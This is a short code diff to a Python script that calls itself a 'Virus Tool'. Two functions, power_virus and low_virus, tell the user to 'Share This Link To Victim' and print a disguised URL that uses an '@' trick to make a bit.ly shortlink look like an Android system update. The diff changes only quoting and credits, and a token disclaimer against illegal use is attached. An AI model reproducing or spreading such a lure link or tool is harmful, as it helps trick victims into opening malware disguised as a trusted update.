@@ -23,7 +23,7 @@ def power_virus():
 	print("")
 	print("Share This Link To Victim")
 	print("------------------------------------------")
-	slowprint('''android.sys.update.com@bit.ly/3EAvZQ3''')
+	slowprint("android.sys.update.com@bit.ly/3EAvZQ3")
 	print("------------------------------------------")
 	slowprint('''Don't Use This App For Any Kind Of illegal Activites''')
 
@@ -41,7 +41,7 @@ def low_virus():
 	print("")
 	print("Share This Link To Victim")
 	print("--------------------------------------------")
-	slowprint('''android.sys.update.com@bit.ly/3EAvZQ3''')
+	slowprint("android.sys.update.com@bit.ly/3EAvZQ3")
 	print("--------------------------------------------")
 	slowprint('''Don't Use This App For Any Kind Of illegal Activites''')
 
@@ -56,6 +56,7 @@ print('''
                                             ''')
 print("")
 print("The Best Virus Tool Maded By King-Nazim")
+print("Helped By Sulthan And Mishal")
 print("----------------------------------------")
 print("Be legal")
 print("----------------------------------------")
